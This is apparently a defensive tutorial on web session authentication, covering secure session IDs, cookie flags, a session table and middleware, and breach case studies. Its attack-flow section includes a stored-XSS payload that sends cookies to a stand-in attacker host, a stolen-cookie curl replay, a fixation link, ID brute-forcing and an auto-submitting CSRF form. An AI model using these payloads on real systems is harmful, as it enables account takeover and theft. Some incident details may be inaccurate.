# Session Authentication — Part 1 of 3

### Sections: 1 (Attacker Intuition), 2 (Why It Exists), 3 (Core Technical), 4 (Attack Flows)

**Series:** Authentication & Security → Topic 02

---

## SECTION 1 — Attacker Intuition

### How a Security Engineer Sees Session Authentication Before Writing One Line of Code

```
Session authentication is a TRUST MECHANISM.
The server issues a ticket after login. Every subsequent request presents that ticket.
The server trusts whoever holds the ticket.

Attacker's first thought:
  "If I can STEAL the ticket — I am that user."
  "If I can FORGE the ticket — I am ANY user."
  "If the ticket never expires — stolen = permanently compromised."
  "If the ticket ID is predictable — I can guess other users' sessions."

The entire architecture of session security exists to answer:
  1. Can the attacker steal the session ID? (Network, XSS, logs)
  2. Can the attacker forge a session ID? (Random generation, server-side store)
  3. Can the attacker fix the session ID before login? (Session fixation)
  4. Can the attacker ride the session without the user's knowledge? (CSRF)
  5. How long does a stolen session remain valid? (Expiry, rotation, revocation)
```

### The Fundamental Analogy

```
SESSION AUTHENTICATION = Coat Check at a theatre

1. You arrive (unauthenticated). Give your coat (credentials) to the attendant.
2. Attendant verifies your coat is real (not stolen). Stores it.
3. Attendant gives you a CLAIM TICKET (session cookie) — a random number.
4. You watch the show. At intermission you want your coat back.
5. You show the ticket (session cookie). Attendant looks up ticket → retrieves YOUR coat.
6. The attendant trusts whoever presents the ticket — not because they recognize your face,
   but because they trust the ticket was only given to the coat's real owner.

ATTACK SURFACE:
  Steal the ticket (XSS, packet sniff) → get the coat (the user's account)
  Forge a ticket → claim any coat (only works if ticket is predictable or unsigned)
  The attendant goes home, taking all tickets with him (server restart clears sessions)
  The ticket never expires → lost ticket = permanent access to your coat
```

### What Developers Get Wrong

```
WRONG MENTAL MODEL:
  "The user is logged in because they have a cookie."

CORRECT MENTAL MODEL:
  "The user is logged in because their session ID is present in the server-side store,
   that session is unexpired, that session belongs to an active account,
   and the session ID was generated with cryptographic randomness so it cannot be guessed."

Every word in that sentence represents a security control.
Remove any one of them → attack surface opens.

Most common developer failure:
  Using a predictable session ID (userId + timestamp, sequential number)
  → Attacker cycles through IDs → finds valid sessions → hijacks accounts

  Real-world case: Apache Tomcat (CVE-2018-11784): session ID had insufficient entropy
  in certain configurations → session prediction attack viable.
```

---

## SECTION 2 — Why It Exists

### HTTP Is Stateless — Sessions Are the Patch

```
Core problem: HTTP has no memory.

Request 1: POST /login { email, password } → Server verifies → "OK this is Alice"
Request 2: GET /dashboard → Server asks: "Who are you?"
           HTTP does not remember. Alice must re-authenticate on every request.

This is unusable.

Session authentication solves this by creating state OUTSIDE HTTP.
Server stores: "session_abc123 belongs to Alice, created at 14:00, expires at 22:00"
Client stores: "my session ID is session_abc123" (in a cookie)
Next request: cookie sent automatically → server looks up → "ah, this is Alice"

The state lives on the server. The client only carries a pointer (the session ID).
This is the key difference from JWT: JWT carries the state in the token itself.
```

### Real-World Breaches Caused by Session Mismanagement

**Incident 1 — British Airways Data Breach (2018, £183M fine)**

```
What happened:
  Attackers compromised BA's session handling via a skimming script (Magecart group).
  The script exfiltrated session cookies and payment data in real-time for 2 weeks.
  ~500,000 customers affected.

Root cause (session-specific):
  Session cookies did not have the Secure flag.
  Man-in-the-browser attack captured session tokens.
  No anomaly detection on concurrent sessions from different IPs.

Security failure:
  Secure flag missing → session ID transmitted over HTTP in some flows → capturable.
  Long session expiry → stolen sessions remained valid throughout the campaign.

Result: £183M GDPR fine (reduced to £20M on appeal).
        Largest GDPR fine in the UK at that time.
```

**Incident 2 — GitHub Session Confusion (2012)**

```
What happened:
  A developer discovered that GitHub was not properly invalidating sessions on logout.
  After logout, the session cookie still worked for a period.

Security failure:
  Session record not deleted on logout — only client-side cookie cleared.
  Server-side session remained valid → an attacker who captured the cookie
  could continue using the session after the user believed they had logged out.

Principle violated:
  Logout MUST invalidate the server-side session record immediately.
  Clearing the cookie alone is a client-side operation the user's device performs —
  it doesn't stop a copy of the cookie (stolen beforehand) from working.
```

**Incident 3 — Slackbot Session Fixation (2015, HackerOne disclosed)**

```
What happened:
  Researcher found that Slack's session cookie was NOT rotated after login.
  Attack scenario: Attacker sets a known session ID before login (link in email/URL param).
  Victim logs in. Session becomes authenticated — attacker already knows the ID.

Security failure:
  Session fixation: server accepted attacker-supplied session ID and elevated it to
  an authenticated session on successful login.

Fix: Always regenerate the session ID on privilege elevation (login, sudo, role switch).
  Old session: trash. New session: newly random ID associated with authenticated user.
```

---

## SECTION 3 — Core Technical Deep Dive

### Session Authentication Full Flow

```
STEP 1: USER SUBMITS LOGIN CREDENTIALS
─────────────────────────────────────────────────────────────────────────────
  Browser          →  POST /login { email, password }  →  Application Server

  Application Server:
    1. Look up user by email
    2. Verify: bcrypt.compare(password, user.password_hash)
    3. If match:
         a. Generate session ID: crypto.randomBytes(32).toString('hex') → 64-char hex
         b. Create session record in store:
            { id: sess_abc123, userId: "usr_789", createdAt: now(),
              expiresAt: now() + 24h, ipAddress: req.ip, userAgent: req.headers['user-agent'] }
         c. Set cookie:
            Set-Cookie: sessionId=sess_abc123; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=86400
    4. Return 200 + user profile (no sensitive session internals)

STEP 2: SUBSEQUENT AUTHENTICATED REQUEST
─────────────────────────────────────────────────────────────────────────────
  Browser          →  GET /dashboard (Cookie: sessionId=sess_abc123)  →  App Server

  Application Server (middleware):
    1. Extract sessionId from cookie
    2. Look up session in store: SELECT * FROM sessions WHERE id = $sessionId
    3. If found AND expiresAt > now() AND is_revoked = false:
         a. Attach user to request: req.user = { id: session.userId, ...claims }
    4. If not found OR expired:
         a. Clear cookie on client: Set-Cookie: sessionId=; Max-Age=0
         b. Return 401 Unauthorized → redirect to login

STEP 3: LOGOUT
─────────────────────────────────────────────────────────────────────────────
  Browser          →  POST /logout (Cookie: sessionId=sess_abc123)  →  App Server

  Application Server:
    1. Delete session from store: DELETE FROM sessions WHERE id = $sessionId
    2. Clear cookie: Set-Cookie: sessionId=; Expires=Thu, 01 Jan 1970 00:00:00 GMT; Path=/
    3. Return 200

  IMPORTANT: Step 1 is mandatory. Step 2 alone does nothing against a stolen cookie.
```

### Session Storage Options

```
┌─────────────────────┬──────────────┬──────────────┬────────────────────────────┐
│ Storage             │ Speed        │ Persistence  │ Scalability                │
├─────────────────────┼──────────────┼──────────────┼────────────────────────────┤
│ In-memory (default) │ Fastest      │ None         │ Single server ONLY         │
│ (express-session    │              │ (lost on      │ Load-balanced systems:     │
│  default store)     │              │  restart)     │ different server = no sess │
├─────────────────────┼──────────────┼──────────────┼────────────────────────────┤
│ Redis               │ Very fast    │ Configurable │ Any number of servers       │
│                     │ (in-memory   │ (persistence │ All share Redis instance   │
│                     │  key-value)  │  optional)   │ Industry standard choice   │
├─────────────────────┼──────────────┼──────────────┼────────────────────────────┤
│ PostgreSQL/MySQL    │ Slower       │ Full         │ Good for auditing          │
│                     │ (disk I/O)   │ (survives    │ Session history available  │
│                     │              │  restarts)   │ Complex queries possible   │
├─────────────────────┼──────────────┼──────────────┼────────────────────────────┤
│ Encrypted cookie    │ No lookup    │ Client-side  │ Infinite — no server store │
│ (cookie-session)    │ needed       │              │ No revocation possible     │
│                     │              │              │ Server validates signature │
└─────────────────────┴──────────────┴──────────────┴────────────────────────────┘

Production recommendation: Redis
  - AWS ElastiCache Redis
  - Sub-millisecond lookup
  - TTL built-in (session expiry = Redis key expiry)
  - Supports session invalidation (DEL key)
  - Cluster mode for HA
```

### Cookie Security Flags — The Full Map

```
FLAG: HttpOnly
  Effect: Cookie not accessible via document.cookie (JavaScript cannot read it)
  Defends against: XSS → cookie theft
  Without it: Any XSS → attacker reads session cookie → account takeover

FLAG: Secure
  Effect: Cookie only sent over HTTPS connections, never HTTP
  Defends against: Man-in-the-middle attacks on HTTP connections
  Without it: HTTP request (redirect before HTTPS) → cookie sent in plaintext → interceptable

FLAG: SameSite=Strict
  Effect: Cookie NOT sent on cross-site requests (another domain's form/link)
  Defends against: CSRF (Cross-Site Request Forgery)
  Trade-off: Breaks OAuth flows if you return from IdP to your app

FLAG: SameSite=Lax (default in modern browsers)
  Effect: Cookie NOT sent on cross-site POST/iframe/img, but IS sent on top-level GET navigation
  Defends against: Most CSRF scenarios
  Allows: User clicking a link from email/another site to navigate to your app

FLAG: SameSite=None
  Effect: Cookie sent on all cross-site requests
  Requires: Secure flag also set
  Use case: Third-party embedded widgets, SSO frames

FLAG: Path=/
  Effect: Cookie only sent for requests to / and below (all paths)

FLAG: Max-Age=86400
  Effect: Cookie expires in 86400 seconds (24 hours)
  Better than Expires: (absolute time) because Max-Age is relative to client clock

FLAG: Domain=
  Effect: Cookie scope. Omit for current domain only.
  If set: cookie is sent to all subdomains too.

PRODUCTION MINIMUM:
  Set-Cookie: sessionId=<id>; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=86400
```

### Session Lifecycle Events

```javascript
// Session record schema (PostgreSQL)
CREATE TABLE sessions (
  id           VARCHAR(64) PRIMARY KEY,       -- crypto.randomBytes(32).toString('hex')
  user_id      UUID NOT NULL REFERENCES users(id),
  created_at   TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  last_seen_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  expires_at   TIMESTAMPTZ NOT NULL,
  ip_address   INET,
  user_agent   TEXT,
  is_revoked   BOOLEAN NOT NULL DEFAULT FALSE,
  CONSTRAINT sessions_user_id_fkey FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

CREATE INDEX ON sessions (user_id);         -- fast: list all sessions for a user
CREATE INDEX ON sessions (expires_at);      -- fast: cleanup expired sessions

// Middleware: session validation
async function requireSession(req, res, next) {
  const sessionId = req.cookies.sessionId;
  if (!sessionId) return res.status(401).json({ error: 'UNAUTHENTICATED' });

  const session = await db.query(
    `SELECT s.*, u.id as user_id, u.email, u.role, u.account_status
     FROM sessions s
     JOIN users u ON s.user_id = u.id
     WHERE s.id = $1
       AND s.expires_at > NOW()
       AND s.is_revoked = FALSE`,
    [sessionId]
  );

  if (!session) {
    res.clearCookie('sessionId');
    return res.status(401).json({ error: 'SESSION_INVALID' });
  }

  if (session.account_status === 'locked') {
    return res.status(403).json({ error: 'ACCOUNT_LOCKED' });
  }

  // Update last_seen (async — don't await, non-blocking)
  db.query('UPDATE sessions SET last_seen_at = NOW() WHERE id = $1', [sessionId]);

  req.user = {
    id: session.user_id,
    email: session.email,
    role: session.role,
    sessionId: session.id,
  };
  next();
}
```

---

## SECTION 4 — Attack Flows

### Attack 1: Session Hijacking via XSS

```
PRECONDITION: No HttpOnly flag on session cookie.

STEP 1: Attacker finds stored XSS in product review field.
  Input: <script>
    fetch('https://evil.attacker.com/steal?c=' + document.cookie)
  </script>

STEP 2: Attacker posts review on popular product. Review is stored and displayed.

STEP 3: Victim visits product page. Script executes in victim's browser.
  document.cookie contains: sessionId=sess_abc123abc123...
  Cookie value exfiltrated to attacker's server.

STEP 4: Attacker makes request with stolen session ID:
  curl -H "Cookie: sessionId=sess_abc123abc123..." https://target.com/account

STEP 5: Server looks up sess_abc123... → finds valid session → returns account data.
  Attacker is now indistinguishable from the victim.
  No credentials were stolen. No password needed. Just the session ID.

STEP 6: Attacker changes email + password → lock out the real user → complete takeover.

DURATION OF ACCESS: Until the session expires OR the victim logs out (server-side).

DEFENSE:
  HttpOnly flag: document.cookie does not include HttpOnly cookies.
  The script returns nothing. XSS is present but cookie theft is blocked.
```

### Attack 2: Session Fixation

```
PRECONDITION: Server does not regenerate session ID after login.

STEP 1: Attacker visits login page. Server creates an unauthenticated session:
  Cookie: sessionId=sess_ATTACKER_KNOWN_ID

STEP 2: Attacker tricks victim into using the same session ID.
  Method A: URL parameter (old sites that accept session ID in URL):
    Send link: https://target.com/login?sessionId=sess_ATTACKER_KNOWN_ID
  Method B: Network attack: inject Set-Cookie header if MITM possible.

STEP 3: Victim logs in with attacker-known session ID.
  Server: validates credentials → creates authenticated session record for sess_ATTACKER_KNOWN_ID
  Session is now authenticated but the attacker ALREADY KNOWS the ID.

STEP 4: Attacker uses sess_ATTACKER_KNOWN_ID → authenticated as the victim.
  No credentials were needed. Attacker set up the trap before login.

DEFENSE:
  On successful login: ALWAYS generate a NEW session ID.

  // Login handler
  const newSessionId = crypto.randomBytes(32).toString('hex');
  await db.query('DELETE FROM sessions WHERE id = $1', [req.cookies.sessionId]);
  await db.query('INSERT INTO sessions (id, user_id, ...) VALUES ($1, $2, ...)',
                 [newSessionId, user.id, ...]);
  res.cookie('sessionId', newSessionId, cookieOptions);

  Old session: deleted. New session: random. Attacker's planted ID: useless.
```

### Attack 3: Session Prediction

```
PRECONDITION: Session IDs are not cryptographically random.

EXAMPLES OF PREDICTABLE SESSION IDs:
  - Sequential: sess_1, sess_2, sess_3
  - Timestamp-based: sess_1735689600_5512 (epoch + userId)
  - MD5 of email+timestamp: sess_5f4dcc3b5aa765d61d8327deb882cf99
  - Short IDs: sess_abc1 (only 4 chars hex = 65536 possibilities)

ATTACK:
  Attacker collects one valid session ID → reverse-engineers the generation pattern.
  Or: brute-forces short IDs (65536 attempts = trivial).
  Or: observes pattern across multiple registrations.

  For each candidate ID:
    GET /api/me  Cookie: sessionId=<candidate>
    → 200 with user data? Session found → account hijacked.

SCALE:
  At 1000 requests/second (limited by server rate limit):
  65536 IDs = 65 seconds to test all possibilities.
  No credentials. No MFA bypass needed. Pure ID guessing.

DEFENSE:
  crypto.randomBytes(32): 256 bits of entropy.
  2^256 possible values = ~1.16 × 10^77
  At 10^12 guesses/second: ~10^65 years to brute force.
  Computationally impossible.

  Never derive session IDs from any predictable data:
    - never from userId
    - never from timestamp
    - never from IP address
    - only from: cryptographic random number generator
```

### Attack 4: Cross-Site Credential Submission (CSRF — Preview)

```
PRECONDITION: SameSite=None or missing. CSRF token absent.

STEP 1: User is logged in to bank.com (cookie: sessionId=valid_session)

STEP 2: User visits evil.com (attacker-controlled page).
  evil.com contains:
    <form action="https://bank.com/transfer" method="POST" id="f">
      <input name="to" value="attacker_account">
      <input name="amount" value="10000">
    </form>
    <script>document.getElementById('f').submit()</script>

STEP 3: Browser automatically includes bank.com cookies with the cross-site POST.
  bank.com sees: valid session cookie + transfer request → processes it.

STEP 4: Transfer completed. Attacker receives $10,000.
  Victim sees nothing. No password prompt. No confirmation.

DEFENSE (preview — full topic in CSRF section):
  SameSite=Strict: bank.com cookie NOT sent in cross-origin POST → request unauthenticated.
  CSRF token: attacker does not know the per-session/per-form token → form rejected.

NOTE: Modern browsers default to SameSite=Lax which blocks this POST.
      Old browsers or SameSite=None + no CSRF token = vulnerable.
```
